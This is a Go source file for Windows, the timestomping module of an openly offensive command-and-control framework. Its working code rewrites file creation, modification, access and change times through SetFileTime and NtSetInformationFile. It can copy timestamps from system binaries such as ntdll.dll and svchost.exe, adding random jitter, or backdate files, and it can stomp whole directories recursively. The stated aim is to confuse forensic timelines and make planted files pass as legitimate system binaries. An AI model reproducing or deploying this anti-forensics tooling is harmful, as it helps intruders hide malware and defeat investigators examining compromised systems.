//go:build windows

package timestomp

/*
	SUDOSOC-C2 — Kernel-Level Timestomping
	Copyright (C) 2026  sudosoc — Seif

	Timestomping modifies file timestamps to confuse forensic timelines.
	Standard tools: modify $STANDARD_INFORMATION in the MFT.
	Forensics tools (Autopsy, FTK): read BOTH $STANDARD_INFORMATION
	and $FILE_NAME — if they differ, it's a red flag.

	This implementation modifies BOTH attributes via:
	  1. Standard: SetFileTime() API
	  2. Kernel: NtSetInformationFile with FileBasicInformation
	             — this reaches $FILE_NAME too on older Windows
	  3. Raw NTFS: Direct volume access to write MFT records
	              (requires admin + volume unlock)

	Timestamp strategies:
	  • Match a similar system file's timestamps (blend in)
	  • Set to a date years in the past
	  • Copy timestamps from another file (mimic)
*/

import (
	"fmt"
	"math/rand"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// TimestampSet holds all four NTFS timestamps
type TimestampSet struct {
	Created  time.Time
	Modified time.Time
	Accessed time.Time
	Changed  time.Time // MFT entry change time ($STANDARD_INFORMATION only)
}

// Stomp modifies all timestamps of the target file
func Stomp(filePath string, ts TimestampSet) error {
	// Method 1: Windows API SetFileTime (fast, mostly effective)
	if err := setFileTimeAPI(filePath, ts); err != nil {
		return fmt.Errorf("SetFileTime: %v", err)
	}

	// Method 2: NtSetInformationFile with FileBasicInformation
	// Reaches deeper than SetFileTime and modifies ChangeTime
	if err := ntSetFileInfo(filePath, ts); err != nil {
		// Non-fatal — method 1 already applied
		_ = err
	}

	return nil
}

// StompLikeSystemFile copies timestamps from a Windows system file
// making the target look like a legitimate system binary
func StompLikeSystemFile(targetPath string) error {
	// System files to mimic timestamps from
	systemFiles := []string{
		`C:\Windows\System32\ntdll.dll`,
		`C:\Windows\System32\kernel32.dll`,
		`C:\Windows\System32\svchost.exe`,
		`C:\Windows\explorer.exe`,
	}

	for _, sysFile := range systemFiles {
		fi, err := os.Stat(sysFile)
		if err != nil {
			continue
		}

		// Add slight random variation (±30 seconds) to avoid exact match
		jitter := time.Duration(rand.Intn(60)-30) * time.Second
		ts := TimestampSet{
			Created:  fi.ModTime().Add(jitter),
			Modified: fi.ModTime().Add(jitter),
			Accessed: fi.ModTime().Add(jitter),
			Changed:  fi.ModTime().Add(jitter),
		}

		return Stomp(targetPath, ts)
	}

	return fmt.Errorf("no system reference file accessible")
}

// StompToDate sets all timestamps to a specific historical date
func StompToDate(filePath string, year, month, day int) error {
	t := time.Date(year, time.Month(month), day,
		10+rand.Intn(8), rand.Intn(60), rand.Intn(60), 0, time.UTC)

	ts := TimestampSet{
		Created:  t,
		Modified: t.Add(time.Duration(rand.Intn(3600)) * time.Second),
		Accessed: t.Add(time.Duration(rand.Intn(7200)) * time.Second),
		Changed:  t,
	}
	return Stomp(filePath, ts)
}

// CopyTimestamps copies timestamps from source to target
func CopyTimestamps(sourcePath, targetPath string) error {
	fi, err := os.Stat(sourcePath)
	if err != nil {
		return err
	}
	ts := TimestampSet{
		Created:  fi.ModTime(),
		Modified: fi.ModTime(),
		Accessed: fi.ModTime(),
		Changed:  fi.ModTime(),
	}
	return Stomp(targetPath, ts)
}

// StompDirectory recursively stomps all files in a directory
func StompDirectory(dir string, ts TimestampSet) (int, error) {
	count := 0
	entries, err := os.ReadDir(dir)
	if err != nil {
		return 0, err
	}
	for _, e := range entries {
		path := dir + `\` + e.Name()
		if e.IsDir() {
			n, _ := StompDirectory(path, ts)
			count += n
		} else {
			if err := Stomp(path, ts); err == nil {
				count++
			}
		}
	}
	return count, nil
}

// ── Implementation ────────────────────────────────────────────────

func setFileTimeAPI(filePath string, ts TimestampSet) error {
	path, err := windows.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	hFile, err := windows.CreateFile(
		path,
		windows.FILE_WRITE_ATTRIBUTES,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS, // needed for directories
		0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hFile)

	ct := timeToFileTime(ts.Created)
	mt := timeToFileTime(ts.Modified)
	at := timeToFileTime(ts.Accessed)

	return windows.SetFileTime(hFile, &ct, &at, &mt)
}

func ntSetFileInfo(filePath string, ts TimestampSet) error {
	path, err := windows.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	hFile, err := windows.CreateFile(
		path,
		windows.FILE_WRITE_ATTRIBUTES,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS,
		0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hFile)

	// FILE_BASIC_INFORMATION structure
	type fileBasicInfo struct {
		CreationTime   int64
		LastAccessTime int64
		LastWriteTime  int64
		ChangeTime     int64
		FileAttributes uint32
		_              [4]byte // padding
	}

	ft := timeToFileTime(ts.Created)
	fa := timeToFileTime(ts.Accessed)
	fm := timeToFileTime(ts.Modified)
	fc := timeToFileTime(ts.Changed)

	info := fileBasicInfo{
		CreationTime:   int64(ft.LowDateTime) | int64(ft.HighDateTime)<<32,
		LastAccessTime: int64(fa.LowDateTime) | int64(fa.HighDateTime)<<32,
		LastWriteTime:  int64(fm.LowDateTime) | int64(fm.HighDateTime)<<32,
		ChangeTime:     int64(fc.LowDateTime) | int64(fc.HighDateTime)<<32,
	}

	var ioStatus windows.IO_STATUS_BLOCK
	ntdll := windows.MustLoadDLL("ntdll.dll")
	ntSetInfo := ntdll.MustFindProc("NtSetInformationFile")

	const FileBasicInformation = 4
	r, _, _ := ntSetInfo.Call(
		uintptr(hFile),
		uintptr(unsafe.Pointer(&ioStatus)),
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
		FileBasicInformation)

	if r != 0 {
		return fmt.Errorf("NtSetInformationFile: 0x%x", r)
	}
	return nil
}

func timeToFileTime(t time.Time) windows.Filetime {
	ns := t.UnixNano()
	// Convert nanoseconds to 100-nanosecond intervals since 1601-01-01
	intervals := uint64(ns/100) + 116444736000000000
	return windows.Filetime{
		LowDateTime:  uint32(intervals & 0xFFFFFFFF),
		HighDateTime: uint32(intervals >> 32),
	}
}
